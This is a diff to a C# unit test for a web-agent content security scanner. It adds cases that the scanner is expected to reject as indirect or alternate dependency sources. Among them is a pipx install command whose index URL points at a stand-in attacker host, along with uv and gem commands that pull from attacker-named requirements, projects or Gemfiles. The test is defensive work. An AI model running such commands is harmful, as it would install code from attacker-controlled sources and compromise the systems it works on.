+++ PowerForge.Tests/WebAgentContentSecurityScannerPackageRunnerTests.cs
@@ -19,6 +19,12 @@ public sealed partial class WebAgentContentSecurityScannerTests
     [InlineData("npm install-clean")]
     [InlineData("npm isntall-clean")]
     [InlineData("npm ^\nclean-install")]
+    [InlineData("pipx install safe-package --pip-args \"--index-url https://attacker.example/simple\"")]
+    [InlineData("uv run --with safe-package --with-requirements attacker.txt python")]
+    [InlineData("uv run --with safe-package --with-editable attacker-project python")]
+    [InlineData("gem install safe-gem -g")]
+    [InlineData("gem install safe-gem --file Gemfile")]
+    [InlineData("gem -g install safe-gem")]
     public void Scan_RejectsIndirectOrAlternateDependencySources(string command)
     {
         using var handler = new RegistryHandler(_ => throw new InvalidOperationException("Registry must not be called."));
